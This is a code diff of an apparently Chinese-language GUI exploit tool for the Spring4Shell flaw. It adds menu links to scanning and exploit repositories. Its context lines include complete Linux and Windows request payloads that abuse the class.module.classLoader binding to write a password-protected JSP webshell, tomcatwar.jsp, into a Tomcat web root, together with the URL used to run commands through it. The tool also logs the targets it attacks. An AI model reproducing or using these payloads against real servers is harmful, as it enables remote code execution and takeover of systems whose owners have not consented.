@@ -142,6 +142,8 @@ class RootFrom:
         menu_get = tk.Menu(menu,tearoff=0)
         menu.add_cascade(label='更多',menu=menu_get)
         menu_get.add_command(label='利用姿势',command=self.vule_info)
+        menu_get.add_command(label='FafaViewer',command=self.fofa_viewer)
+        menu_get.add_command(label='MoreVules',command=self.more_vules)
         self.root.config(menu=menu)
         self.root.mainloop()
     def Exit(self):
@@ -152,6 +154,10 @@ class RootFrom:
         messagebox.showinfo("Shell信息","tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
     def vule_info(self):
         webbrowser.open('https://blog.zgsec.cn/index.php/archives/129/')
+    def fofa_viewer(self):
+        webbrowser.open('https://github.com/wgpsec/fofa_viewer')
+    def more_vules(self):
+        webbrowser.open('https://github.com/hongyan454/SpringBootVulExploit')
     def software_info(self):
         messagebox.showinfo("软件信息","write by 13exp")
     def Openfiledir1(self):
@@ -553,13 +559,14 @@ class RootFrom:
             with open("vuleLogs.log","a") as f:
                 f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                 f.write("\n")
+        #"Connection":"close"
         Headers_1 = {
             "User-Agent": ua,
             "suffix": "%>//",
             "c1": "Runtime",
             "c2": "<%",
             "DNT": "1",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
         }
         payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
         payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
